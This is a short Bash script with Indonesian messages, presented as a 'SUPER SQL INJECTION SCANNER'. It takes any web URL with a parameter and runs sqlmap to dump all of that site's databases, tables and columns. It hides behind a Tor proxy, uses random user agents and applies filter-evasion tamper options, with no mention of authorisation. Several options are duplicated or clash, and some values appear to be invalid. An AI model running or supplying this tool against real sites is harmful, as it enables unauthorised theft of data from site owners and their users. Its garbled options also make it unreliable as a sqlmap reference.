#!/bin/bash

# Warna
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
blue='\e[94m'
magenta='\e[95m'
cyan='\e[96m'
reset='\e[0m'

# Tampilan
clear
echo -e "${cyan}  >>> SUPER SQL INJECTION SCANNER <<<${reset}"
echo ""

# Ini loading
loading_bar() {
    bar=">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    for i in {1..35}; do
        echo -ne "\r${yellow}[*] Bentar Scan Dulu ${bar:0:$i}${reset}"
        sleep 0.05
    done
    echo -e "\n"
}

read -p "$(echo -e ${green}"-->> [ LINK WEB ] : "${reset})" target

# URL
if [[ "$target" != *"="* ]]; then
    echo -e "${red}[!] ERROR: PARAMETER TIDAK ADA : index.php?id=1)${reset}"
    exit 1
fi

# Scan
echo -e "${green}>> SCAN DI GASIN <<${reset}"
loading_bar

# Data sql serentak
sqlmap -u "$target" --batch --dbs --tables --columns --dump \
--level=5 --risk=3 --threads=200 --random-agent \
--proxy=http://127.0.0.1:9050 --tor-type=SOCKS5 --check-tor \
--tamper=between,randomcase,space2comment,percentage,charencode,evasion \
--hex --eta --flush-session --fresh-queries --no-cast --drop-set-cookie \
--delay=0 --timeout=90 --retries=15 --safe-url="https://www.google.com" --safe-freq=25 \
--force-ssl --dbms=mysql --random-agent --ignore-redirects \
--keep-alive --answers="quit=N" --timeout=90 --retries=15 --threads=500 \
--technique=BEUSTQ --risk=5 --level=5 --test-queries=50 --batch --drop-set-cookie

# Sukses
echo -e "${green}[✔] Sudah Bos${reset}"
